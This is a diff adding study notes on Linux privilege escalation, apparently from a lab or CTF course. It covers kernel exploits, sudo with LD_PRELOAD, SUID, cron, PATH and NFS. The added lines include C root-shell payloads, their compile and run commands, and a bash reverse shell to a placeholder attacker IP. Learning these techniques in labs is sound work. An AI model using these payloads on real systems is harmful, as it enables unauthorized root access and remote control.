@@ -112,8 +112,149 @@ Find specific file permissions:
 [LinEnum](https://github.com/rebootuser/LinEnum)
 [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
 [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-[Linux Priv Checker](https://github.com/linted/linuxprivchecker )
+[Linux Priv Checker](https://github.com/linted/linuxprivchecker)
 
 ### Privilege Escalation: Kernel Exploits
 
+Used `uname -a` to find the kernel version 3.13.0-24-generic, `searchsploit '3.13' 'kernel'`
+to find exploits for that kernel version. Tried a couple but got the error: 
+version \`GLIBC_2.34' not found. After googling found out it needed to be compiled with the 
+`-static` tag `gcc /path/to/exploit -static -o exploit-output`. Used linux/local/37292.c 
+from searchsploit and got a root shell
 
+
+Hints/Notes:
+
+[Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
+
+1. Being too specific about the kernel version when searching for exploits on Google, 
+Exploit-db, or searchsploit
+
+2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit 
+codes can make changes on the operating system that would make them unsecured in further 
+use or make irreversible changes to the system, creating problems later. Of course, these 
+may not be great concerns within a lab or CTF environment, but these are absolute no-nos 
+during a real penetration testing engagement.
+
+3. Some exploits may require further interaction once they are run. Read all comments and 
+instructions provided with the exploit code.
+
+4. You can transfer the exploit code from your machine to the target system using the 
+SimpleHTTPServer Python module and wget respectively.
+
+### Privilege Escalation: Sudo
+
+`sudo -l` to check root privileges, [GTFOBins](https://gtfobins.github.io/) to find binaries
+we can exploit.
+
+**Application Functions**
+
+Leverage application functions like Apache2 server's `-f` to read files with root 
+permissions (first lines in this case).
+
+**LD_PRELOAD**
+
+If `env_keep+=LD_PRELOAD` is enabled we can generate a shared library that will be loaded 
+and executed before the program is.
+
+*Note: The LD_PRELOAD option will be ignored if the real user ID is different from the 
+effective user ID.*
+
+C code to spawn a root shell:
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+}
+```
+
+Save it and compile as a shared library:
+
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+Run a program with the LD_PRELOAD option set
+
+`sudo LD_PRELOAD=/path/to/shell.so find`
+
+### Privilege Escalation: SUID
+
+List all files with SUID or SGID set
+
+`find / -type f -perm -04000 -ls 2>/dev/null`
+
+Find binaries on GTFOBins may not be an auto root, may need intermediate steps e.g you can
+use base64 to read files requiring root privileges if the bit is set.
+
+### Privilege Escalation: Capabilities
+
+Another method system administrators can use to increase the privilege level of a process 
+or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. 
+
+Use `getcap` to list enabled capabilities and find binaries on GFTFOBins
+
+### Privilege Escalation: Cron Jobs
+
+Find cronjobs in `/etc/crontab`, look for jobs running at elevated privileges and jobs 
+whose script has been removed but not the job itself.
+
+As netcat usually won't have the `-e` option use bash or other available scripting 
+languages for the reverse shell.
+
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
+```
+
+### Privilege Escalation: PATH
+
+Questions to answer:
+
+1. What folders are located under $PATH
+2. Does your current user have write privileges for any of these folders?
+3. Can you modify $PATH?
+4. Is there a script/application you can start that will be affected by this vulnerability?
+
+Find writable folders with `find / -writable 2>/dev/null`
+
+Example:
+
+Find writable folder `/writable/path` and `test` binary (SUID bit set), which executes thm, 
+inside. 
+
+Add writable directory fo PATH, run `echo "cat /path/to/flag" > thm; chmod 777 thm` and 
+`./test` to execute the `cat` command in `thm` displaying the flag file contents.
+
+### Privilege Escalation: NFS
+
+NFS config is found in the `/etc/exports` files
+
+Enumerate mountable shares with `showmount -e <TARGET-IP>`
+
+Mount a share
+
+`mount -o rw <TARGET-IP>:/path/to/share /tmp/nfs`
+
+Write basic root shell in the share
+
+```
+int main(){
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+
+Compile it and set SUID bit
+
+`gcc shell.c -o shell; chmod +s shell`
+
+Execute the shell binary to gain a root shell 
